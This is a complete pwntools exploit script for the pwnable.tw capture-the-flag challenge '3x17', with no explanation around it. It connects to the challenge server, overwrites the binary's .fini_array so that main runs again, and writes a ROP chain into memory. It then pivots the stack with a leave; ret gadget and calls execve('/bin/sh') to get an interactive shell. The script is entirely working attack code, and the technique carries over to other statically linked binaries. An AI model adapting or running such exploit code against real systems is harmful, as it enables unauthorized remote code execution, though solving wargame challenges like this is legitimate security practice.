from pwn import *

context(arch = "amd64", os = "linux", log_level = "DEBUG")

finit_addr = 0x402960
main_addr = 0x401B6D

fini_array = 0x4B40F0

leave_ret = 0x401C4B

#ROP
pop_rax = 0x000000000041e4af
pop_rdx = 0x0000000000446e35
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
syscall = 0x00000000004022b4

def write(addr,data):
	p.recvuntil("addr:")
	p.send(str(addr))
	p.recvuntil("data:")
	p.send(data)

#p = process("./3x17")
#gdb.attach(p)

p = remote("chall.pwnable.tw", 10105)

write(fini_array, p64(finit_addr) + p64(main_addr))

write(fini_array + 0x10, p64(0x3b))
write(fini_array + 0x18, p64(pop_rdx) + p64(0))
write(fini_array + 0x28, p64(pop_rsi) + p64(0))
write(fini_array + 0x38, p64(pop_rdi) + p64(0x50 + fini_array))
write(fini_array + 0x48, p64(syscall))
write(fini_array + 0x50, "/bin/sh\0")
write(fini_array, p64(leave_ret) + p64(pop_rax))

p.interactive()
